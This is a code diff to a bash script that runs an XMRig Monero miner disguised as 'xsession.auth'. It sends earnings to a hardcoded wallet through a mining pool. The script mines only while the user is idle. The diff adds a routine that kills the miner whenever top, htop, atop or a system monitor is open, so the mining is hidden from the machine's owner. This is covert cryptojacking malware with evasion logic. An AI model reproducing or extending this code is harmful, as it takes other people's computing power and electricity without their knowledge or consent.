@@ -5,7 +5,8 @@ XMRIGNAME=xsession.auth
 WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
 LOCAL_PATH=$HOME/.local/bin
 POOL=pool.hashvault.pro:80
-
+INACTIVITY_IN_MINS=1
+INACTIVITY_IN_MSEC=$(($INACTIVITY_IN_MINS * 60 * 1000))
 
 ensure_os() {
 	machine=$(uname -m)
@@ -17,8 +18,6 @@ ensure_os() {
 	if [[ $id != "linuxmint" && $id != "fedora" ]]; then
 			exit
 	fi
-
-
 }
 
 run_xmr() {
@@ -28,17 +27,24 @@ run_xmr() {
 	fi		 
 }
 
+ensure_no_top() {
+	if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "gnome-system-monitor"; then
+		pkill $XMRIGNAME
+	fi
+}
+
 main() {
 	ensure_os
 
 	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
 
-	while true
-	do 
+	while true; do 
+		ensure_no_top
+
 		if [[ isUI -eq 1 ]]; then
 			idle=$(xprintidle)
 			echo "UI, idle for $idle"
-			if [[ idle -gt 60000 ]]; then
+			if [[ idle -gt $INACTIVITY_IN_MSEC ]]; then
 				run_xmr
 			else 
 				pkill $XMRIGNAME 
@@ -51,7 +57,7 @@ main() {
 			elif [[ $idle != "." ]]; then 
 				idleH=$(cut -d':' -f1)
 				idleM=$(cut -d':' -f2)
-				if [[ $idleH -gt 0 || $idleM -gt 1 ]]; then
+				if [[ $idleH -gt 0 || $idleM -gt $INACTIVITY_IN_MINS ]]; then
 					run_xmr
 				else
 					pkill $XMRIGNAME
